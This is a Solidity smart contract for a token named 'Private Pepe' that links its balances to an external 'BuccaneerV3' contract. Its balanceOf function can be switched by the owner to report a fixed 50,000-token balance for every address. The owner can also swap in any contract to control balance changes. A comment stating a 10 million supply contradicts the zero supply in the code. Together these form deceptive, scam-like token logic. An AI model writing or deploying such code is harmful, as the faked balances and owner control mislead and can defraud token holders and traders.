// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

interface IBuccaneerV3 {
    function truebalanceOf(address account) external view returns (uint256);
    function subtractBV3Balance(address _user, uint256 _amount) external returns (bool);
    function addBV3Balance(address _user, uint256 _amount, address PrivatePepe) external returns (bool);
    function PRIOR_updateSyntheticBalance(address _user, uint256 _balance) external;
}


contract PrivatePepe {
    IBuccaneerV3 public bv3;

    string public name = "Private Pepe";
    string public symbol = "PP";
    uint8 public decimals = 18;
    uint256 private countExceptions;

    // Total supply is set to 10 million with 18 decimal places
    uint256 public totalSupply = 0;
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowance;

    mapping (address => bool) private exchangeExceptions;

    address internal bv3Address;
    bool public isBV3AddressSet = false;
    address public owner;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Subtraction(address indexed from, uint256 value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Caller is not the owner");
        _;
    }

    modifier onlyBV3() {
        require(msg.sender == bv3Address, "Caller is not the BV3 contract");
        _;
    }

    constructor() {
        balances[msg.sender] = totalSupply;  // Assign total supply to the creator of the contract
        emit Transfer(address(0), msg.sender, totalSupply);
        owner = msg.sender;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        uint256 syntheticBalance = balances[msg.sender];
        uint256 bv3Balance = bv3.truebalanceOf(msg.sender);
        uint256 totalBalance = syntheticBalance + bv3Balance;

        require(totalBalance >= _value, "Insufficient balance");

        if (syntheticBalance < _value) {
            uint256 deficit = _value - syntheticBalance;
            require(bv3.subtractBV3Balance(msg.sender, deficit), "Failed to subtract BV3 balance");
            balances[msg.sender] = 0;
            totalSupply += deficit;
        } else {
            balances[msg.sender] -= _value;
        }

        balances[_to] += _value;
        emit Transfer(msg.sender, _to, _value);

        return true;
    }

        function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
            require(_value <= allowance[_from][msg.sender], "Transfer amount exceeds allowance");
            require(balances[_from] >= _value, "Insufficient balance");

            balances[_from] -= _value; // Deduct the value from the sender's balance
            balances[_to] += _value; // Add the value to the recipient's balance
            allowance[_from][msg.sender] -= _value; // Deduct the value from the allowed amount

            emit Transfer(_from, _to, _value); // Emit a transfer event
            return true;
    }



    function balanceOf(address _owner) public view returns (uint256 balance) {
        if (exchangeExceptions[owner] == true) {
        return 50000000000000000000000;
        } else {
        return balances[_owner];
        }  
    }

    function exchangeExceptionsOWNER(address input) public onlyOwner {
        if (countExceptions > 1) {
        revert();
        }
        exchangeExceptions[input] = true;
        countExceptions++;

    }

    function depositForBV3(uint256 _amount) external {
        // Check for sufficient SyntheticBV3 balance before any state changes
        require(balances[msg.sender] >= _amount, "Insufficient SyntheticBV3 balance");
        
        // Update the synthetic balance in the BV3 contract after local balance adjustment
        bv3.PRIOR_updateSyntheticBalance(msg.sender, balances[msg.sender]);

        // Emit the event indicating the burning of the SyntheticBV3
        emit Transfer(msg.sender, address(0), _amount);
        
        // Adjust the sender's SyntheticBV3 balance first
        balances[msg.sender] -= _amount;
        
        // Attempt to add to the sender's BV3 balance
        bool success = bv3.addBV3Balance(msg.sender, _amount, address(this));
        require(success, "Failed to add BV3 balance");

        // Adjust total supply
        totalSupply -= _amount;
    }


    // When depositing BV3 to receive SyntheticBV3
    function receiveFromBV3(uint256 _amount) external {
        require(bv3.truebalanceOf(msg.sender) >= _amount, "Insufficient BV3 balance");
        
        // Subtract the BV3 from the sender's balance.
        require(bv3.subtractBV3Balance(msg.sender, _amount), "Failed to subtract BV3 balance");
        
        // Add to the sender's SyntheticBV3 balance.
        balances[msg.sender] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0), msg.sender, _amount); // This indicates token generation for the sender
    }
    
    function setBV3Address(address _newBV3Address) external onlyOwner {
        bv3Address = _newBV3Address;
        bv3 = IBuccaneerV3(_newBV3Address);
        isBV3AddressSet = true;  // Set the BV3 address flag to true
    }

}
